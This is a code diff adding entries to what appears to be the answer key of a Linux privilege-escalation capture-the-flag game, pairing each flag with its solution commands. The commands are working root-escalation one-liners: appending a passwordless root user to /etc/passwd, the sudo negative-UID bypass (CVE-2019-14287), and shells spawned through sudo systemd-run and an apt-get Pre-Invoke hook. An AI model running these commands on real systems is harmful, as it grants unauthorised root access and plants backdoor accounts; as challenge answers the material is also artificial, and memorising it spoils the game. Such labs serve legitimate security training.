@@ -39,8 +39,20 @@ const SOLUTIONS = {
     },
     27: {
         flag: 'flag{dac_0verride_pwn}',
-        final: true,
         cmds: ["python3 -c \"open('/etc/passwd','a').write('pwnd::0:0::/root:/bin/bash\\n')\"", 'su pwnd']
+    },
+    28: {
+        flag: 'flag{sudo_negative_uid_cve201914287}',
+        cmds: ['sudo -u#-1 /bin/bash']
+    },
+    29: {
+        flag: 'flag{systemd_run_sudo_pwn}',
+        cmds: ['sudo systemd-run /bin/sh']
+    },
+    30: {
+        flag: 'flag{apt_get_preinvoke_pwn}',
+        final: true,
+        cmds: ['sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh']
     },
 };
 
